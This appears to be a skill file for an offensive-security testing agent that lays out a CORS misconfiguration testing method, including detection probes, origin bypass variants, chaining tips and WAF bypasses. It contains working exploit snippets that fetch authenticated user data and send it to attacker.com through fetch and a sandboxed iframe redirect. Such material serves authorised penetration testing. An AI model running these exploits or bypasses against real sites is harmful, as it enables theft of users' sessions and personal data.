---

name: web-20-cors
sequence: web-20
category: xss
domain: web
description: "CORS misconfiguration testing skill for offensive security. Covers origin reflection, null origin bypass, regex bypass, wildcard with credentials, HTTP protocol downgrade, subdomain trust abuse, and pre-flight OPTIONS bypass. Use when testing cross-origin resource sharing configurations."
wordlist_ref: "wordlists/web/web-26-cors/"
---

# CORS Misconfiguration — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test for CORS misconfigurations that allow unauthorized cross-origin data access — including origin reflection, null origin bypass, regex bypass, wildcard with credentials, and subdomain trust abuse.

## OWASP Mapping
- A01:2021 Broken Access Control
- A05:2021 Security Misconfiguration
- CWE-346: Origin Validation Error
- CWE-942: Permissive Cross-domain Policy

## Vulnerability Classes

### 1. Origin Reflection (Arbitrary Origin Trusted)
**Attack pattern:**
- Server reflects any Origin value: `Origin: https://attacker.com` → `ACAO: https://attacker.com`
- Combined with `Access-Control-Allow-Credentials: true` → steal authenticated user data cross-origin

**Detection probe:**
```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=abc

Expected response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**Exploit:**
```javascript
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal?d=' + JSON.stringify(data)));
```

### 2. Null Origin Bypass
**Pattern:**
- Server trusts `Origin: null` with credentials
- Null origin sent by: sandboxed iframes, data: URIs, file:// origins, cross-origin redirects

**Detection:**
```
GET /api/data HTTP/1.1
Origin: null
Cookie: session=abc

Response: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true
```

**Exploit:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,
<script>fetch("https://target.com/api/data",{credentials:"include"})
.then(r=>r.text()).then(d=>top.location="//attacker.com/?"+d)</script>'>
```

### 3. Regex Bypass via Prefix/Suffix Matching
**Pattern:** Server validates Origin with weak regex

**Bypass variants:**
```
Origin: https://target.com.attacker.com     (suffix match bypass)
Origin: https://attacker.target.com         (prefix match — subdomain)  
Origin: https://attackertarget.com          (contains match)
Origin: https://target.com%60.attacker.com  (encoded character)
Origin: https://target.com@attacker.com     (URL authority confusion)
Origin: https://target.com_.attacker.com    (underscore)
Origin: https://notarget.com               (not-a-check bypass)
```

**Minimum 25 origin bypass variants to test per target domain**

### 4. Wildcard Origin with Credentials
**Invalid per spec but some servers implement:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Browsers don't allow this (CORS spec violation), but custom HTTP clients can exploit.
Flag as misconfiguration even if browsers block it.

**Actual risk:** mobile apps or custom API clients that implement their own CORS — they honor `*` with credentials.

### 5. HTTP Protocol Downgrade
**Pattern:**
- `https://target.com` server trusts `http://target.com` origin
- Attacker MITM on HTTP → inject Origin in HTTP request
- Response with credentials allowed for HTTP origin → credential theft

```
Origin: http://target.com  (HTTP instead of HTTPS)
```

### 6. Subdomain Trust (CORS + Subdomain Takeover Chain)
**Pattern:**
- Server trusts all subdomains: `*.target.com`
- Attacker takes over `evil.target.com` (see web-21)
- Make authenticated requests from `evil.target.com` → CORS allows it

**Also test:**
- Compromised subdomain hosting reflected XSS → CORS + XSS chain

### 7. Pre-flight OPTIONS Bypass
**Pattern:**
- Server only validates CORS on `OPTIONS` preflight, not on actual request
- Submit non-simple request without preflight → server responds without ACAO check
- Or server returns permissive headers on OPTIONS but different on GET → exploit GET

### 8. CORS on Sensitive Endpoints
**High-priority endpoints to test:**
```
/api/user/profile         — PII exposure
/api/account/settings     — account modification
/api/auth/token           — token endpoints
/api/payments             — financial data
/api/admin/               — admin functions
/api/keys                 — API key management
/api/export               — data export
/.well-known/jwks.json    — JWT public keys
```

### 9. Exposed Non-Sensitive CORS (Low Risk)
**Not worth reporting:**
- `Access-Control-Allow-Origin: *` on public static resources (JS, CSS, images)
- `Access-Control-Allow-Origin: *` on public API without credentials
- CORS on `/favicon.ico`, `/robots.txt`

**Only report:** ACAO: * OR reflected origin AND sensitive data endpoint AND credentials allowed

---

# Alert: "Cross-Domain Misconfiguration", "CORS Header"
## Attack Surface (Parameter Matrix)

| Surface | CORS Tests |
|---------|-----------|
| Origin header | All 25+ bypass variants per endpoint |
| API endpoints | All discovered endpoints from web-02 |
| Authentication endpoints | Token, login, logout |
| User data endpoints | Profile, settings, PII |
| Admin endpoints | Admin API paths |
| WebSocket endpoints | WebSocket CORS (Origin in handshake) |
| OPTIONS pre-flight | Pre-flight bypass |
| HTTP protocol | HTTP vs HTTPS origin |

---

## HackerOne Report Patterns

**Pattern 1: Origin reflection on API (H1 #426282 type)**
`/api/v1/user` reflects any Origin with `Access-Control-Allow-Credentials: true`. Attacker page makes authenticated cross-origin request → full account data exfiltration.

**Pattern 2: Null origin in sandboxed iframe (H1 #470520 type)**
Server trusts `Origin: null`. Attacker creates sandboxed iframe with `data:text/html` → null origin → fetch credentials-inclusive → steal session data.

**Pattern 3: Subdomain CORS + subdomain takeover chain (H1 combined)**
API trusts `*.example.com` → attacker takes over `static.example.com` → posts malicious JS → CORS allows authenticated requests from taken subdomain.

**Pattern 4: Regex suffix bypass (H1 #1424571 type)**
Server checks `if origin.endsWith('.target.com')` → `attacker.target.com` passes check → origin reflected → credentials exposed.

**Pattern 5: CORS on GraphQL without authentication check**
GraphQL endpoint has permissive CORS (`*`) → anonymous query returns other users' data → CORS amplifies unauthenticated data exposure.

---

## Zero-Day Research Hooks

### Novel CORS Bypass Vectors
- IPv6 origin: `Origin: http://[::1]` → IP-based allowlist bypass
- Port variation: `Origin: https://target.com:80` → port not normalized in check
- IDN homograph: `Origin: https://tаrget.com` (Cyrillic а) → if Unicode not normalized
- URL fragment: `Origin: https://target.com#evil` → some parsers truncate at #
- Double-encoding: `Origin: https://target%252Ecom` → double-encoded dot bypass
- Localhost variants: `Origin: http://localhost`, `http://0.0.0.0`, `http://127.0.0.1`

---

## False Positive Mitigation
- ONLY flag when ACAO reflects attacker-controlled origin AND ACAC is true AND endpoint returns sensitive data
- Do NOT flag ACAO: * on public endpoints without credentials
- Do NOT flag CORS on static resources (fonts, images, JS libraries)
- Confirm sensitive data actually returned in cross-origin response
- NEVER emit on single signal; require score ≥ 3 + 1 category

---




## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-26-cors/`

**Files**:
- `wordlists/web/web-26-cors/payloads/cors/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

